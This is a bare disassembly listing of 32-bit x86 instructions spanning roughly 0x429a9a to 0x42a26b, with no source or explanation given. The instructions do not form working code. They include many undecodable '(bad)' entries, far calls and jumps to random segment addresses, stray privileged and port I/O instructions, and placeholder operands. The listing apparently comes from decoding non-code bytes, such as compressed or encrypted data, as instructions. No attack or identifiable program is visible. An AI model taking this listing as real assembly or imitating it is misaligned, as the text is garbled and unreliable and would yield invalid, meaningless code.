  429a9a:	ss push eax
  429a9c:	shl    esi,0x9a
  429a9f:	pop    ebp
  429aa0:	adc    ebx,ecx
  429aa2:	push   ebx
  429aa3:	push   0xa7862f79
  429aa8:	dec    ebx
  429aa9:	jno    0x429ae2
  429aab:	ficomp WORD PTR [ebx]
  429aad:	(bad)  
  429aae:	hlt    
  429aaf:	add    BYTE PTR [edx+0xa],cl
  429ab2:	popf   
  429ab3:	mov    edx,0xd958ef55
  429ab8:	gs sub cl,dl
  429abb:	ja     0x429a41
  429abd:	mov    eax,ds:0x3209a550
  429ac2:	adc    DWORD PTR ds:0x71da23f1,eax
  429ac8:	fdiv   DWORD PTR [ecx-0x6a76f766]
  429ace:	add    ah,BYTE PTR [ebx-0x68]
  429ad1:	jo     0x429a67
  429ad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ad4:	fnstsw WORD PTR [eax-0x2e285265]
  429ada:	sar    DWORD PTR [edx+esi*4-0x12e6662d],cl
  429ae1:	and    al,0x3f
  429ae3:	in     eax,dx
  429ae4:	jmp    0x545e2f4
  429ae9:	jmp    0x5c80a1cd
  429aee:	call   0xb01d:0x2b5f4fde
  429af5:	(bad)  
  429af7:	fiadd  WORD PTR [ebx+ecx*1+0x6e8d071b]
  429afe:	cmp    DWORD PTR [ecx+0x229a93d2],ebp
  429b04:	in     eax,0xc9
  429b06:	(bad)  
  429b07:	pushf  
  429b08:	stos   BYTE PTR es:[edi],al
  429b09:	call   0x22e0420a
  429b0e:	add    eax,0x39ed8856
  429b13:	jg     0x429aa2
  429b15:	mov    ds:0xc642cd9d,eax
  429b1a:	dec    ebx
  429b1b:	pushf  
  429b1c:	xchg   edx,eax
  429b1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b1e:	push   ss
  429b1f:	push   edx
  429b20:	push   ebp
  429b21:	or     al,0x5d
  429b23:	or     BYTE PTR [edi-0x64],bl
  429b26:	pop    ss
  429b27:	mov    DWORD PTR [esi],0xb3a8eb05
  429b2d:	xor    BYTE PTR [ebx+0x1bc4f98d],ah
  429b33:	stos   DWORD PTR es:[edi],eax
  429b34:	push   0xffffffbb
  429b36:	mov    bl,0xa7
  429b38:	lock cmc 
  429b3a:	or     al,0x9a
  429b3c:	fmul   DWORD PTR [ebx+ebp*1-0x1a3c4dfa]
  429b43:	dec    DWORD PTR [edi]
  429b45:	jecxz  0x429b95
  429b47:	imul   ebp,DWORD PTR [esi-0x493536f5],0x429cddb4
  429b51:	inc    ecx
  429b52:	call   0x356c:0x6564961f
  429b59:	icebp  
  429b5a:	pop    edi
  429b5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429b5c:	ds pop edi
  429b5e:	adc    al,BYTE PTR [esp+edx*4]
  429b61:	je     0x429bbd
  429b63:	lods   eax,DWORD PTR ds:[esi]
  429b64:	push   ecx
  429b65:	jmp    0xc2c4a0f
  429b6a:	bndldx bnd0,[ebx+0xf]
  429b6e:	mov    dl,ah
  429b70:	sti    
  429b71:	add    al,0x96
  429b73:	adc    eax,0xb81acfe2
  429b78:	sub    al,0xeb
  429b7a:	or     al,0x1f
  429b7c:	mov    dl,0x4f
  429b7e:	add    BYTE PTR [esi-0x65],ah
  429b81:	jns    0x429b40
  429b83:	mov    WORD PTR [edi+0xb],?
  429b86:	shl    dh,1
  429b88:	or     ebx,DWORD PTR [ebp+0x3f]
  429b8b:	and    DWORD PTR [edi+0x2d],ecx
  429b8e:	jmp    0x92ae:0x66a8b3cf
  429b95:	mov    eax,ds:0x2b8282c1
  429b9a:	add    ah,BYTE PTR [edi+0x2c72cda1]
  429ba0:	xchg   ebx,eax
  429ba1:	sbb    dl,bh
  429ba3:	and    DWORD PTR [eax-0x4df44e04],esp
  429ba9:	mov    ds:0xf028af93,eax
  429bae:	lods   eax,DWORD PTR ds:[esi]
  429baf:	mov    esp,ebp
  429bb1:	push   edx
  429bb2:	adc    DWORD PTR [edi-0x3cb57cc8],esp
  429bb8:	ret    
  429bb9:	scas   al,BYTE PTR es:[edi]
  429bba:	call   0x1b3d:0xd2022632
  429bc1:	clc    
  429bc2:	bound  esp,QWORD PTR [edi-0x1a78c216]
  429bc8:	repnz push esp
  429bca:	mov    ebp,0xb986b5ee
  429bcf:	pop    ebx
  429bd0:	(bad)  
  429bd1:	fs jnp 0x429b5e
  429bd4:	mov    eax,ds:0x4d42765f
  429bd9:	or     edx,DWORD PTR [ebx-0x18ac9ff2]
  429bdf:	cwde   
  429be0:	pop    ebx
  429be1:	dec    esi
  429be2:	(bad)  
  429be3:	push   ebx
  429be4:	add    eax,0xc6164a0b
  429be9:	pop    DWORD PTR [ecx-0x51f43548]
  429bef:	ror    ebp,1
  429bf1:	sub    ebx,DWORD PTR [ecx-0x7f]
  429bf4:	ret    0x9944
  429bf7:	mov    WORD PTR [ebx+0x6],cs
  429bfa:	mov    DWORD PTR [esi],eax
  429bfc:	pop    esp
  429bfd:	xchg   ebx,eax
  429bfe:	push   edi
  429bff:	mov    esp,eax
  429c01:	cmc    
  429c02:	dec    edi
  429c03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429c04:	fcom   QWORD PTR [esi]
  429c06:	lahf   
  429c07:	push   ss
  429c08:	push   ecx
  429c09:	test   DWORD PTR [esi-0xf],ebx
  429c0c:	mov    dl,0x5b
  429c0e:	xor    eax,0x945ee6f0
  429c13:	adc    BYTE PTR [ebx+ecx*1],bl
  429c16:	jmp    0x4a531848
  429c1b:	lods   eax,DWORD PTR ds:[esi]
  429c1c:	cli    
  429c1d:	cdq    
  429c1e:	call   0x8867:0x72238b76
  429c25:	xchg   edx,eax
  429c26:	(bad)  
  429c27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429c28:	cmc    
  429c29:	pop    ecx
  429c2a:	pushf  
  429c2b:	dec    eax
  429c2c:	inc    ebp
  429c2d:	ja     0x429c18
  429c2f:	push   ecx
  429c30:	xchg   esi,eax
  429c31:	out    dx,eax
  429c32:	xor    al,0xcd
  429c34:	mov    dl,0x58
  429c36:	mov    ch,BYTE PTR [ebp+eiz*2-0x3a589f5e]
  429c3d:	in     al,dx
  429c3e:	pop    eax
  429c3f:	jg     0x429c41
  429c41:	(bad)  
  429c42:	lahf   
  429c43:	test   BYTE PTR [ebx+ebx*4+0x5632113e],ch
  429c4a:	jnp    0x429cbd
  429c4c:	inc    esp
  429c4d:	or     dh,al
  429c4f:	test   eax,0xde4d573c
  429c54:	xchg   ecx,eax
  429c55:	retf   
  429c56:	icebp  
  429c57:	fld    QWORD PTR [edx-0x27]
  429c5a:	lods   al,BYTE PTR ds:[esi]
  429c5b:	sub    BYTE PTR [edx+0x4d76b6fb],dh
  429c61:	loope  0x429c60
  429c63:	mov    ecx,0xc1a70bec
  429c68:	cmp    ecx,DWORD PTR [eax+0x2c]
  429c6b:	jne    0x429c07
  429c6d:	xor    ebx,DWORD PTR [edx+0x39c62ee3]
  429c73:	mov    WORD PTR [esp+edx*2-0x4cd6587e],ds
  429c7a:	(bad)  
  429c7b:	test   eax,0xb715d333
  429c80:	mov    dl,0x3a
  429c82:	loop   0x429c4f
  429c84:	push   ss
  429c85:	jp     0x429cf3
  429c87:	hlt    
  429c88:	int3   
  429c89:	mov    ebx,0xb29434d
  429c8e:	out    0xba,eax
  429c90:	pusha  
  429c91:	sbb    al,0x85
  429c93:	shr    ecx,0x87
  429c96:	call   0x1ed6:0xba098f68
  429c9d:	jmp    0x429d13
  429c9f:	mov    edx,0xe793eddf
  429ca4:	inc    edx
  429ca5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429ca6:	lahf   
  429ca7:	ret    0xa047
  429caa:	retf   0x6a74
  429cad:	jo     0x429c48
  429caf:	repz int3 
  429cb1:	retf   
  429cb2:	popf   
  429cb3:	sub    ah,BYTE PTR [ecx+0x101326b3]
  429cb9:	or     esi,esi
  429cbb:	ins    BYTE PTR es:[edi],dx
  429cbc:	enter  0x5822,0x7a
  429cc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429cc1:	push   0xffffffe4
  429cc3:	shl    BYTE PTR [edx-0x1e1ba4cc],0x1c
  429cca:	retf   
  429ccb:	xchg   BYTE PTR fs:[ebx],dh
  429cce:	stos   DWORD PTR es:[edi],eax
  429ccf:	inc    ebp
  429cd0:	mov    dl,0x82
  429cd2:	adc    al,0x4b
  429cd4:	in     al,dx
  429cd5:	sub    al,0x2e
  429cd7:	and    eax,0x35f83e89
  429cdc:	push   edi
  429cdd:	xchg   DWORD PTR [edx+0x77e214dd],ebx
  429ce3:	mov    ch,0xb8
  429ce5:	(bad)  
  429ce6:	fisub  DWORD PTR [ecx+ebx*1-0x78e69b2d]
  429ced:	add    DWORD PTR [edx],0x861d7e84
  429cf3:	add    bl,BYTE PTR [edx+esi*4-0x4b6421a6]
  429cfa:	mov    dl,0x23
  429cfc:	aad    0xa
  429cfe:	add    DWORD PTR [ebx+0x47],esi
  429d01:	leave  
  429d02:	ss cmp bl,dh
  429d05:	jnp    0x429d41
  429d07:	cdq    
  429d08:	inc    esi
  429d09:	mov    eax,ds:0x41d25d9a
  429d0e:	inc    ecx
  429d0f:	sbb    eax,0xa74d559a
  429d14:	inc    eax
  429d15:	mul    DWORD PTR [edx]
  429d17:	xchg   ebx,eax
  429d18:	pop    esi
  429d19:	jmp    0x429d7f
  429d1b:	dec    eax
  429d1c:	mov    cl,0x57
  429d1e:	lahf   
  429d1f:	push   0xffffffe3
  429d21:	sti    
  429d22:	inc    esi
  429d23:	pop    ds
  429d24:	shl    dl,1
  429d26:	jge    0x429ccf
  429d28:	sbb    al,0x3
  429d2a:	cs add al,0x9c
  429d2d:	inc    esp
  429d2e:	and    esp,DWORD PTR [edi]
  429d30:	mov    dl,0x39
  429d32:	aam    0x91
  429d34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d35:	das    
  429d36:	mov    eax,0xb028c
  429d3b:	inc    esp
  429d3c:	outs   dx,DWORD PTR ds:[esi]
  429d3d:	inc    ecx
  429d3e:	jae    0x429d12
  429d40:	popa   
  429d41:	add    bl,BYTE PTR [edx+0x455317e]
  429d47:	out    0xf7,eax
  429d49:	and    eax,0x4f5ea7b1
  429d4e:	sar    DWORD PTR [eax-0x59],1
  429d51:	mov    ebp,0xb6febfcf
  429d56:	inc    ebp
  429d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429d58:	dec    ebx
  429d59:	mov    eax,ds:0xd0af1226
  429d5e:	or     BYTE PTR [edi+0x1c66d35],ah
  429d64:	(bad)  
  429d65:	sti    
  429d66:	or     eax,0x774e9472
  429d6b:	jmp    0x26fa:0x27d996b2
  429d72:	repz test eax,0xcc1064d7
  429d78:	adc    dh,BYTE PTR [ebx-0x38a117a8]
  429d7e:	call   0x16a:0x38059213
  429d85:	mov    ds:0x7641b907,al
  429d8a:	and    bh,ah
  429d8c:	mov    edi,0xfa6859ae
  429d91:	cmc    
  429d92:	jmp    0x7482:0xa48cb322
  429d99:	inc    edx
  429d9a:	je     0x429d60
  429d9c:	pop    esi
  429d9d:	pop    eax
  429d9e:	or     eax,0x94bee6a7
  429da3:	push   esp
  429da4:	test   BYTE PTR [edi-0x3f493a2c],al
  429daa:	mov    ds:0x1a4d29f1,al
  429daf:	xchg   ecx,eax
  429db0:	adc    al,0xae
  429db2:	adc    BYTE PTR [edi+0x4ce9cb42],ah
  429db8:	loopne 0x429dd7
  429dba:	pop    esp
  429dbb:	mov    al,ds:0x5c29f7b2
  429dc0:	and    DWORD PTR [ecx],ebx
  429dc2:	mov    ecx,0x190b19dd
  429dc7:	out    0x4f,eax
  429dc9:	enter  0xf23,0x5f
  429dcd:	dec    edx
  429dce:	call   0xc221:0x3cf3afaf
  429dd5:	push   edi
  429dd6:	in     al,0xa7
  429dd8:	outs   dx,BYTE PTR ds:[esi]
  429dd9:	or     al,al
  429ddb:	aam    0x2d
  429ddd:	jmp    0x3767:0xc7b1a9fc
  429de4:	inc    edx
  429de5:	loop   0x429e44
  429de7:	aas    
  429de8:	ret    
  429de9:	in     eax,0x2b
  429deb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429dec:	icebp  
  429ded:	mov    cl,0xdb
  429def:	sbb    edx,DWORD PTR [eax+0x1e]
  429df2:	bound  ecx,QWORD PTR ds:0xc79a0f96
  429df8:	sub    BYTE PTR [ebx],dh
  429dfa:	pusha  
  429dfb:	ins    DWORD PTR es:[edi],dx
  429dfc:	mov    bl,0xc6
  429dfe:	or     DWORD PTR [esi-0x5058e37b],esp
  429e04:	sahf   
  429e05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e06:	mov    ebx,0x9ada364b
  429e0b:	shl    DWORD PTR [ecx-0x54],0x89
  429e0f:	xor    edx,DWORD PTR [ecx]
  429e11:	push   0x55
  429e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e14:	das    
  429e15:	aam    0x76
  429e17:	mov    eax,0xcdde40aa
  429e1c:	mov    dl,0x2f
  429e1e:	jns    0x429e54
  429e20:	ret    0x2ad2
  429e23:	push   eax
  429e24:	push   ebx
  429e25:	or     edi,eax
  429e27:	aas    
  429e28:	inc    edx
  429e29:	mov    dl,BYTE PTR [eax+0x61621e43]
  429e2f:	addr16 push cs
  429e31:	daa    
  429e32:	call   0x4a84:0x8c9afd06
  429e39:	cwde   
  429e3a:	add    DWORD PTR [eax+0x2640a3bb],ebp
  429e40:	xchg   ecx,eax
  429e41:	ins    BYTE PTR es:[edi],dx
  429e42:	mov    eax,0xa3ae6232
  429e47:	repnz mov dl,0x88
  429e4a:	neg    bh
  429e4c:	and    al,dh
  429e4e:	or     eax,0x76083a27
  429e53:	push   eax
  429e54:	mov    cl,0xb7
  429e56:	jle    0x429ea6
  429e58:	inc    edx
  429e59:	push   ds
  429e5a:	ss mov dh,0xa
  429e5d:	jns    0x429df9
  429e5f:	cld    
  429e60:	(bad)  
  429e61:	jmp    0x72fe3507
  429e66:	adc    BYTE PTR [edi],bh
  429e68:	in     eax,dx
  429e69:	or     al,0x68
  429e6b:	pop    esi
  429e6c:	mov    ecx,0xee7dcc1
  429e71:	push   ds
  429e72:	mov    edi,0x4a75b2fa
  429e77:	shl    al,0x25
  429e7a:	cdq    
  429e7b:	inc    eax
  429e7c:	cmp    BYTE PTR [ebx],cl
  429e7e:	sbb    DWORD PTR [esp+eax*1],edx
  429e81:	ss jecxz 0x429e70
  429e84:	sahf   
  429e85:	hlt    
  429e86:	call   0x7497:0x506c89b
  429e8d:	ret    
  429e8e:	(bad)  
  429e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e90:	repz test BYTE PTR [ebx+0x6a073c1b],bh
  429e97:	mov    al,ds:0xba308bb1
  429e9c:	mov    esp,0x4e072c27
  429ea1:	add    BYTE PTR [ebx],cl
  429ea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ea4:	nop
  429ea5:	mov    edi,0x50e30f53
  429eaa:	and    DWORD PTR [edi],ebp
  429eac:	sub    ch,dl
  429eae:	fadd   QWORD PTR [eax-0x3d]
  429eb1:	(bad)  
  429eb2:	mov    esi,gs
  429eb4:	enter  0x9a70,0x4d
  429eb8:	add    al,0xb3
  429eba:	mov    ?,edi
  429ebc:	cmp    al,0xe
  429ebe:	mov    DWORD PTR [esi+0x64978a72],ebx
  429ec4:	mov    bl,BYTE PTR [esi+0xa]
  429ec7:	jg     0x429f1e
  429ec9:	sbb    BYTE PTR [edx-0x515fb96],0x74
  429ed0:	xor    eax,0xf9b5a971
  429ed5:	xchg   edx,eax
  429ed6:	sub    DWORD PTR [eax+0x22f01f06],esp
  429edc:	cmp    eax,0xfc541aa4
  429ee1:	aaa    
  429ee2:	scas   al,BYTE PTR es:[edi]
  429ee3:	popf   
  429ee4:	xchg   DWORD PTR [ecx+0x331b6c1a],ebp
  429eea:	xchg   edi,eax
  429eeb:	lods   al,BYTE PTR ds:[esi]
  429eec:	mov    al,0x6a
  429eee:	call   0x5d5c:0x2660c336
  429ef5:	dec    esp
  429ef6:	cmc    
  429ef7:	sahf   
  429ef8:	enter  0x9a44,0x93
  429efc:	(bad)  
  429efe:	inc    eax
  429eff:	aas    
  429f00:	shl    DWORD PTR [eax],0x88
  429f03:	add    edi,eax
  429f05:	cwde   
  429f06:	call   0xca71:0x7003b1a5
  429f0d:	std    
  429f0e:	mov    eax,ds:0x42b4cca7
  429f13:	xchg   ebp,eax
  429f14:	xchg   ebx,eax
  429f15:	jb     0x429f41
  429f17:	and    al,0xb2
  429f19:	popf   
  429f1a:	push   cs
  429f1b:	loop   0x429f6f
  429f1d:	xor    eax,0x578f821a
  429f22:	mov    es,WORD PTR [esi-0x4e]
  429f25:	clc    
  429f26:	ret    
  429f27:	retf   
  429f28:	stos   BYTE PTR es:[edi],al
  429f29:	fidiv  WORD PTR [edi+0x7306b2d3]
  429f2f:	push   ss
  429f30:	xchg   ecx,eax
  429f31:	or     DWORD PTR [ebp-0x78f45115],ebx
  429f37:	add    BYTE PTR [esi],ch
  429f39:	jne    0x429f84
  429f3b:	add    ch,dl
  429f3d:	(bad)  
  429f3e:	xchg   cl,ch
  429f40:	into   
  429f41:	mov    dl,0x5a
  429f43:	popf   
  429f44:	dec    ebp
  429f45:	or     ah,BYTE PTR ds:0x820bdc5c
  429f4b:	sbb    edx,edi
  429f4d:	add    al,0xae
  429f4f:	daa    
  429f50:	push   ecx
  429f51:	jg     0x429eed
  429f53:	adc    al,BYTE PTR [esi-0x35]
  429f56:	test   BYTE PTR [ecx-0x4d],ah
  429f59:	pop    ebp
  429f5a:	icebp  
  429f5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429f5c:	int3   
  429f5d:	out    dx,al
  429f5e:	add    DWORD PTR [esi-0x30],esp
  429f61:	stos   DWORD PTR es:[edi],eax
  429f62:	iret   
  429f63:	xchg   BYTE PTR [ebx+0x56cac68d],dh
  429f69:	das    
  429f6a:	mov    edi,0xc14ec2f3
  429f6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429f70:	pop    bp
  429f72:	test   DWORD PTR [ebp+0x2e8a4a83],ecx
  429f78:	mov    bh,0x39
  429f7a:	ja     0x429f52
  429f7c:	adc    dh,BYTE PTR ds:0x6a29191a
  429f82:	enter  0x44a2,0x57
  429f86:	jns    0x429f9a
  429f88:	jl     0x429f55
  429f8a:	ficomp WORD PTR [edi+0x74]
  429f8d:	sahf   
  429f8e:	call   0xa14e:0x25ef6fcd
  429f95:	jl     0x42a016
  429f97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429f98:	cld    
  429f99:	ins    BYTE PTR es:[edi],dx
  429f9a:	nop
  429f9b:	cld    
  429f9c:	iret   
  429f9d:	jg     0x429f7e
  429f9f:	shl    BYTE PTR [ebp-0x6050cf06],cl
  429fa5:	leave  
  429fa6:	dec    edx
  429fa7:	sbb    bh,BYTE PTR [edx-0x7a]
  429faa:	sub    esp,DWORD PTR [edi+0x258e2e64]
  429fb0:	fwait
  429fb1:	pop    eax
  429fb2:	ins    BYTE PTR es:[edi],dx
  429fb3:	mov    ecx,0x27053888
  429fb8:	push   ds
  429fb9:	sar    BYTE PTR [edx+0x5c],1
  429fbc:	sar    BYTE PTR [esi+0x4832a72d],0xda
  429fc3:	push   edx
  429fc4:	or     DWORD PTR [ebp+0x3f],0x38
  429fc8:	mov    bl,0x8
  429fca:	les    edx,FWORD PTR [esi]
  429fcc:	clc    
  429fcd:	mov    al,ds:0xbb8c2647
  429fd2:	rcr    BYTE PTR [eax],0xb2
  429fd5:	adc    dl,BYTE PTR [ebx-0x621f06cf]
  429fdb:	aaa    
  429fdc:	and    eax,0x9caff00b
  429fe1:	xor    al,0x37
  429fe3:	ss sti 
  429fe5:	outs   dx,DWORD PTR ds:[esi]
  429fe6:	sahf   
  429fe7:	jns    0x42a03e
  429fe9:	ss jne 0x429fb0
  429fec:	xor    eax,0x72445fdd
  429ff1:	mov    ebp,0xbb7ef69
  429ff6:	mov    cl,0x2b
  429ff8:	cs gs js 0x429f84
  429ffc:	jecxz  0x42a056
  429ffe:	call   0x9a8e:0xdf35893c
  42a005:	out    dx,eax
  42a006:	sub    al,0xa7
  42a008:	sbb    ebx,0x6c
  42a00b:	into   
  42a00c:	jmp    0xafe7d3f8
  42a011:	sti    
  42a012:	test   al,0x21
  42a014:	repnz sub eax,DWORD PTR [ebx-0x39f5737c]
  42a01b:	cdq    
  42a01c:	jg     0x42a07c
  42a01e:	sbb    ah,ch
  42a020:	cwde   
  42a021:	sahf   
  42a022:	dec    edx
  42a023:	dec    eax
  42a024:	pop    ebx
  42a025:	mov    al,0x9a
  42a027:	mov    edi,0x9610563b
  42a02c:	test   eax,0x12a73c3c
  42a031:	xchg   ecx,eax
  42a032:	adc    al,cl
  42a034:	pop    ecx
  42a035:	add    ebp,DWORD PTR [edi+0x36]
  42a038:	mov    dl,0xc
  42a03a:	or     eax,0xff8992c0
  42a03f:	ror    BYTE PTR [ebp-0x759afdf5],cl
  42a045:	jge    0x429fde
  42a047:	popf   
  42a048:	jnp    0x42a05f
  42a04a:	cdq    
  42a04b:	add    al,0x33
  42a04d:	imul   esp,DWORD PTR [edx],0x6bdbb184
  42a053:	into   
  42a054:	rcl    BYTE PTR ds:0xb095149f,cl
  42a05a:	ss xchg esi,eax
  42a05c:	sub    ch,BYTE PTR ds:0x2ab59d99
  42a062:	lds    esi,FWORD PTR [ebp-0x1d]
  42a065:	cmp    ebx,ebp
  42a067:	stos   BYTE PTR es:[edi],al
  42a068:	pushf  
  42a069:	ret    
  42a06a:	call   0x8555:0xf5a680ab
  42a071:	pusha  
  42a072:	xchg   BYTE PTR [eax-0x30042120],ah
  42a078:	lds    ecx,FWORD PTR [eax+0x16]
  42a07b:	sbb    ch,BYTE PTR ds:[eax+0x79]
  42a07f:	mov    ecx,0x755543b2
  42a084:	mov    esi,0x19677748
  42a089:	or     esp,DWORD PTR ds:0x525091ce
  42a08f:	xor    eax,0xe68c9738
  42a094:	push   0xffffffef
  42a096:	xchg   DWORD PTR [edx],edi
  42a098:	xor    eax,0x2635f35
  42a09d:	add    ch,dl
  42a09f:	inc    ebp
  42a0a0:	loope  0x42a0aa
  42a0a2:	sbb    bh,BYTE PTR [eax+0x2a]
  42a0a5:	cmp    edi,ebp
  42a0a7:	test   al,0x32
  42a0a9:	hlt    
  42a0aa:	sbb    DWORD PTR [ebp-0x739e294e],esi
  42a0b0:	dec    edi
  42a0b1:	jne    0x42a04a
  42a0b3:	cmp    al,0x8
  42a0b5:	or     BYTE PTR [edi-0x72f23cd5],ch
  42a0bb:	and    DWORD PTR [edi-0x35],0x7da49c20
  42a0c2:	call   0xaa11:0x612b41b8
  42a0c9:	hlt    
  42a0ca:	cmp    al,0xa5
  42a0cc:	ja     0x42a0f2
  42a0ce:	std    
  42a0cf:	fadd   QWORD PTR [edx+eiz*1+0x5a]
  42a0d3:	and    al,BYTE PTR [edi+0x30]
  42a0d6:	cdq    
  42a0d7:	icebp  
  42a0d8:	pushf  
  42a0d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a0da:	dec    edi
  42a0db:	dec    edx
  42a0dc:	ds fsubr st,st(3)
  42a0df:	pop    ds
  42a0e0:	(bad)  
  42a0e1:	or     bh,BYTE PTR [edi]
  42a0e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a0e4:	call   0xc07c:0x6efb401b
  42a0eb:	push   eax
  42a0ec:	(bad)  
  42a0ed:	mov    bl,0x2
  42a0ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a0f0:	cmp    edx,eax
  42a0f2:	mov    al,0x4d
  42a0f4:	xchg   edx,eax
  42a0f5:	sub    DWORD PTR [eax],esi
  42a0f7:	mov    ds:0xdd0df926,al
  42a0fc:	mov    edx,0x1f8c2e8b
  42a101:	xchg   edx,eax
  42a102:	and    ah,BYTE PTR [eax]
  42a104:	lods   al,BYTE PTR ds:[esi]
  42a105:	sysexit 
  42a107:	data16 mov cl,0xfe
  42a10a:	fidivr DWORD PTR [ebx+ecx*1]
  42a10d:	ret    
  42a10e:	sub    al,dh
  42a110:	arpl   WORD PTR [eax],cx
  42a112:	jne    0x42a13b
  42a114:	fidivr DWORD PTR [ecx+eiz*1]
  42a117:	jmp    0xdce2736
  42a11c:	mov    esi,edi
  42a11e:	mov    ah,BYTE PTR [edi-0x54fc1dfb]
  42a124:	sbb    eax,DWORD PTR [esi]
  42a126:	test   DWORD PTR [ecx-0x3a7d8854],ebp
  42a12c:	xor    al,BYTE PTR [edx+0x3b]
  42a12f:	in     al,0xd8
  42a131:	and    al,BYTE PTR [esi+0x191690ec]
  42a137:	xchg   ecx,eax
  42a138:	adc    dh,BYTE PTR [ebx]
  42a13a:	cmp    al,0x27
  42a13c:	stos   BYTE PTR es:[edi],al
  42a13d:	inc    ecx
  42a13e:	xor    esp,DWORD PTR [esi-0x5616e7fc]
  42a144:	jb     0x42a137
  42a146:	fsubr  DWORD PTR [ebx-0x16]
  42a149:	mov    ch,0x9a
  42a14b:	fbstp  TBYTE PTR [eax+esi*1-0x5a]
  42a14f:	mov    bl,BYTE PTR [ecx-0x594b4da7]
  42a155:	(bad)  
  42a156:	cmp    ah,BYTE PTR [edx+edi*8+0x6a3a10c5]
  42a15d:	cmc    
  42a15e:	mov    BYTE PTR [edx-0x4e],al
  42a161:	aad    0xa7
  42a163:	mov    al,0x64
  42a165:	jmp    0xb9bfca7
  42a16a:	sub    eax,0x9742d36b
  42a16f:	test   al,0x70
  42a171:	mov    al,0x9d
  42a173:	es popa 
  42a175:	xor    DWORD PTR [ebx],0xffffffd5
  42a178:	mov    cl,0xf9
  42a17a:	pop    ds
  42a17b:	sbb    al,0x12
  42a17d:	mov    ebx,0xb00c80d
  42a182:	aam    0x28
  42a184:	jbe    0x42a1c4
  42a186:	pop    es
  42a187:	cwde   
  42a188:	cmp    ebx,DWORD PTR [ebx-0x3b31d566]
  42a18e:	pop    edi
  42a18f:	or     al,0x96
  42a191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a192:	retf   0xb9a6
  42a195:	inc    edi
  42a196:	loop   0x42a20e
  42a198:	jae    0x42a1d4
  42a19a:	sbb    eax,edi
  42a19c:	test   DWORD PTR ds:0x4f08169a,esp
  42a1a2:	ja     0x42a1a1
  42a1a4:	aam    0x38
  42a1a6:	push   ebp
  42a1a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a1a8:	push   0xc14ff990
  42a1ad:	add    al,0x66
  42a1af:	ret    
  42a1b0:	mov    dl,0xc6
  42a1b2:	xchg   edi,eax
  42a1b3:	xor    ah,BYTE PTR [eax]
  42a1b5:	or     DWORD PTR ds:[ebx-0x160bf77d],0x74bc8798
  42a1c0:	pop    edx
  42a1c1:	mov    ch,0xe4
  42a1c3:	in     eax,dx
  42a1c4:	push   esi
  42a1c5:	sbb    BYTE PTR [edx+0x7a70e942],0x38
  42a1cc:	fstp   DWORD PTR ds:0xaef5bbd4
  42a1d2:	cmp    bh,ah
  42a1d4:	mov    ah,0x2b
  42a1d6:	jbe    0x42a158
  42a1d8:	rcl    BYTE PTR [ebp+edx*4+0x52],0xf
  42a1dd:	xor    al,0xc
  42a1df:	pop    es
  42a1e0:	les    eax,FWORD PTR [eax-0x3c]
  42a1e3:	pop    esp
  42a1e4:	xor    dh,BYTE PTR [esi-0x6c]
  42a1e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a1e8:	lds    eax,FWORD PTR [esi+0x2e]
  42a1eb:	outs   dx,DWORD PTR ds:[esi]
  42a1ec:	out    0xa5,eax
  42a1ee:	sub    eax,0x31a6b2b7
  42a1f3:	fiadd  DWORD PTR [edi]
  42a1f5:	push   ebx
  42a1f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a1f7:	pop    ecx
  42a1f8:	inc    esi
  42a1f9:	or     esi,esi
  42a1fb:	or     eax,0xd226b227
  42a200:	fdivr  st(6),st
  42a202:	call   0x5705:0x113cca69
  42a209:	les    ebp,FWORD PTR [ebx-0x418b925a]
  42a20f:	test   BYTE PTR [edi+0x4a74c40e],dl
  42a215:	fdiv   QWORD PTR [edi+ebp*4-0x56]
  42a219:	sar    BYTE PTR [ecx],0x38
  42a21c:	push   0x8082e7ea
  42a221:	es (bad) 
  42a223:	leave  
  42a224:	mov    dl,0xa1
  42a226:	hlt    
  42a227:	sbb    BYTE PTR [edi+0x8],dl
  42a22a:	shl    BYTE PTR [edi+eiz*8+0xbae5e32],1
  42a231:	sbb    al,0x22
  42a233:	adc    DWORD PTR [ebx-0xdb6518],esi
  42a239:	int    0x7f
  42a23b:	test   al,0xe8
  42a23d:	fs (bad) 
  42a23f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a240:	outs   dx,DWORD PTR ds:[esi]
  42a241:	sahf   
  42a242:	imul   ebp,DWORD PTR [eax+edi*2+0x3d],0xb3b22181
  42a24a:	adc    bh,BYTE PTR [esi-0x68d83b5e]
  42a250:	ins    DWORD PTR es:[edi],dx
  42a251:	add    al,0x46
  42a253:	dec    esi
  42a254:	dec    ebp
  42a255:	ret    
  42a256:	cli    
  42a257:	pop    es
  42a258:	adc    eax,0xc28e2d29
  42a25d:	fstp   DWORD PTR [edx-0x7d8bf393]
  42a263:	adc    dl,0xcc
  42a266:	fwait
  42a267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a268:	out    0xa2,eax
  42a26a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a26b:	xchg   esp,eax
